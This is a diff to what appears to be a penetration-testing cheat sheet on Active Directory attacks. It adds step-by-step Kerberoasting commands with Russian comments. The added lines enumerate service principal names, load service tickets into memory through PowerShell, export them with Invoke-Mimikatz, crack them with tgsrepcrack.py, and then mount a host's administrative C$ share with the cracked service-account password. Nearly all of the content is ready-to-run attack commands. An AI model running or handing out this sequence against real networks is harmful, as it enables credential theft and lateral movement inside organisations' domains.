@@ -77,6 +77,14 @@ https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
 ## KERBEROASTING (Credentials)
 1) GetUserSPNs.py domain.local/user:password - RECON SPNs
 2) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request
+3) Windows: setspn -T TestDomain -Q */*
+4) Windows: загружаем билеты в память для дальнейних действий.
+            - Add-Type -AssemblyName System.IdentityModel
+            - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"
+            - Проверяем, что билет загружен в память: klist
+            - Invoke-Mimikatz –Command '" kerberos::list"' /export (модуль PowerSploit)
+            - Софт для перебора билета tgsrepcrack.py https://github.com/nidem/kerberoast
+            - После взлома пароля: net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password1
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## GPP Attack (Compromised user, member of AD) https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
